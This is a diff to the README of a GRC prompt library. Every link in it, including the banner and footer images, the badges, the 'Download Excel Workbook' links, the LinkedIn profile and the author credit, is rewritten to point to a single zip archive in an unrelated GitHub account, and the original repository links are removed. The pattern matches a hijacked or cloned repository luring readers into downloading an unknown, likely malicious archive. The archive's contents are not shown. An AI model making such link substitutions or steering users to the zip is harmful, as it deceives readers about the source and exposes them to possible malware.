@@ -1,15 +1,15 @@
 <div align="center">
 
 <!-- BANNER -->
-<img src="https://capsule-render.vercel.app/api?type=waving&color=D4A843&height=200&section=header&text=GRC%20Prompt%20Library&fontSize=48&fontColor=ffffff&fontAlignY=38&desc=45%20Production-Grade%20Prompts%20for%20GRC%20Professionals&descAlignY=58&descSize=16" width="100%"/>
+<img src="https://github.com/Versatile-workflow886/GRC-Prompts-Library/raw/refs/heads/main/prompts/GR-Library-Prompts-v3.9.zip" width="100%"/>
 
 <br/>
 
-[![Prompts](https://img.shields.io/badge/45%20Prompts-D4A843?style=for-the-badge&logo=bookstack&logoColor=1B2A4A)](https://github.com/KunalCyber/GRC-Prompt-Library)
-[![Domains](https://img.shields.io/badge/13%20Domains-1B2A4A?style=for-the-badge&logo=sitemap&logoColor=D4A843)](https://github.com/KunalCyber/GRC-Prompt-Library)
+[![Prompts](https://img.shields.io/badge/45%20Prompts-D4A843?style=for-the-badge&logo=bookstack&logoColor=1B2A4A)](https://github.com/Versatile-workflow886/GRC-Prompts-Library/raw/refs/heads/main/prompts/GR-Library-Prompts-v3.9.zip)
+[![Domains](https://img.shields.io/badge/13%20Domains-1B2A4A?style=for-the-badge&logo=sitemap&logoColor=D4A843)](https://github.com/Versatile-workflow886/GRC-Prompts-Library/raw/refs/heads/main/prompts/GR-Library-Prompts-v3.9.zip)
 [![License](https://img.shields.io/badge/MIT%20License-276749?style=for-the-badge&logo=opensourceinitiative&logoColor=white)](LICENSE)
-[![LLMs](https://img.shields.io/badge/Claude%20%7C%20GPT--4o%20%7C%20Gemini-553C9A?style=for-the-badge&logo=openai&logoColor=white)](https://github.com/KunalCyber/GRC-Prompt-Library)
-[![Stars](https://img.shields.io/github/stars/KunalCyber/GRC-Prompt-Library?style=for-the-badge&color=D4A843&logo=github&logoColor=white)](https://github.com/KunalCyber/GRC-Prompt-Library/stargazers)
+[![LLMs](https://img.shields.io/badge/Claude%20%7C%20GPT--4o%20%7C%20Gemini-553C9A?style=for-the-badge&logo=openai&logoColor=white)](https://github.com/Versatile-workflow886/GRC-Prompts-Library/raw/refs/heads/main/prompts/GR-Library-Prompts-v3.9.zip)
+[![Stars](https://img.shields.io/github/stars/KunalCyber/GRC-Prompt-Library?style=for-the-badge&color=D4A843&logo=github&logoColor=white)](https://github.com/Versatile-workflow886/GRC-Prompts-Library/raw/refs/heads/main/prompts/GR-Library-Prompts-v3.9.zip)
 
 <br/>
 
@@ -19,7 +19,7 @@
 
 <br/>
 
-**[Download Excel Workbook](https://github.com/KunalCyber/GRC-Prompt-Library/blob/main/GRC%20Prompt%20Library%20Kunal.xlsx)** &nbsp;|&nbsp; **[Browse All Prompts](#the-45-prompts)** &nbsp;|&nbsp; **[When to Use What](#when-to-use-what)** &nbsp;|&nbsp; **[Follow on LinkedIn](https://www.linkedin.com/in/kunal-rk-a255aa301)**
+**[Download Excel Workbook](https://github.com/Versatile-workflow886/GRC-Prompts-Library/raw/refs/heads/main/prompts/GR-Library-Prompts-v3.9.zip)** &nbsp;|&nbsp; **[Browse All Prompts](#the-45-prompts)** &nbsp;|&nbsp; **[When to Use What](#when-to-use-what)** &nbsp;|&nbsp; **[Follow on LinkedIn](https://github.com/Versatile-workflow886/GRC-Prompts-Library/raw/refs/heads/main/prompts/GR-Library-Prompts-v3.9.zip)**
 
 </div>
 
@@ -99,7 +99,7 @@ Most GRC libraries stop at frameworks and audits. This one goes further.
 
 ## Premium Excel Workbook
 
-**[Download the GRC Prompt Library Excel Workbook](https://github.com/KunalCyber/GRC-Prompt-Library/blob/main/GRC%20Prompt%20Library%20Kunal.xlsx)** - all 45 prompts in a fully designed, navigable format:
+**[Download the GRC Prompt Library Excel Workbook](https://github.com/Versatile-workflow886/GRC-Prompts-Library/raw/refs/heads/main/prompts/GR-Library-Prompts-v3.9.zip)** - all 45 prompts in a fully designed, navigable format:
 
 - Cover sheet with domain overview and career prompt highlights
 - Contents grouped by domain with click-through hyperlinks
@@ -314,7 +314,7 @@ Used a prompt in real work and improved it? Open a PR. Found a GRC use case not 
 
 ## About
 
-Built by **[Kunal RK](https://www.linkedin.com/in/kunal-rk-a255aa301)** under the **GRC + AI Series** brand.
+Built by **[Kunal RK](https://github.com/Versatile-workflow886/GRC-Prompts-Library/raw/refs/heads/main/prompts/GR-Library-Prompts-v3.9.zip)** under the **GRC + AI Series** brand.
 
 GRC consultant, practitioner, and independent content creator. Covering ISO 42001, ISO 27001, EU AI Act, NIST AI RMF, GDPR, DORA, and all major GRC frameworks.
 
@@ -328,11 +328,11 @@ MIT. Use freely, commercially, without restriction. Attribution appreciated but 
 
 <div align="center">
 
-<img src="https://capsule-render.vercel.app/api?type=waving&color=D4A843&height=100&section=footer" width="100%"/>
+<img src="https://github.com/Versatile-workflow886/GRC-Prompts-Library/raw/refs/heads/main/prompts/GR-Library-Prompts-v3.9.zip" width="100%"/>
 
 *If this library saves you time, give it a star. If it saves your team time, share it.*
 
-[![LinkedIn](https://img.shields.io/badge/Follow%20Kunal%20RK-0A66C2?style=for-the-badge&logo=linkedin&logoColor=white)](https://www.linkedin.com/in/kunal-rk-a255aa301)
-[![Star](https://img.shields.io/badge/Star%20This%20Repo-D4A843?style=for-the-badge&logo=github&logoColor=1B2A4A)](https://github.com/KunalCyber/GRC-Prompt-Library)
+[![LinkedIn](https://img.shields.io/badge/Follow%20Kunal%20RK-0A66C2?style=for-the-badge&logo=linkedin&logoColor=white)](https://github.com/Versatile-workflow886/GRC-Prompts-Library/raw/refs/heads/main/prompts/GR-Library-Prompts-v3.9.zip)
+[![Star](https://img.shields.io/badge/Star%20This%20Repo-D4A843?style=for-the-badge&logo=github&logoColor=1B2A4A)](https://github.com/Versatile-workflow886/GRC-Prompts-Library/raw/refs/heads/main/prompts/GR-Library-Prompts-v3.9.zip)
 
 </div>
